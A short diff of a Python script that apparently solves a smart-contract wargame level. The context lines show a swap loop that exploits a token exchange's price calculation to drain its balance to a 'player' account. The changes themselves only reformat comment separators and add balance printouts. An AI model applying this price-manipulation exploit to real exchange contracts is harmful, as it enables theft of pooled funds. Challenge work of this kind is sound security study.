@@ -42,9 +42,9 @@ def main():
     )
     print(f"\nprice = {price}\n")
 
-    ################################################
+    ###############################################################################
     # Swap loop
-    ################################################
+    ###############################################################################
     while price <= token_from.balanceOf(target):
         target.swap(
             token_from,
@@ -69,11 +69,14 @@ def main():
         )
         print(f"\nprice = {price}\n")
 
-    ################################################
+    ###############################################################################
 
     amount = int(token_from.balanceOf(player) * token_to.balanceOf(target) / price)
     price = target.getSwapPrice(token_from, token_to, amount)
     target.swap(token_from, token_to, amount, {"from": player})
+    balances(target)
+    print(f"player balance token_1 = {token1.balanceOf(player)}")
+    print(f"player balance token_2 = {token2.balanceOf(player)}")
 
 
 """
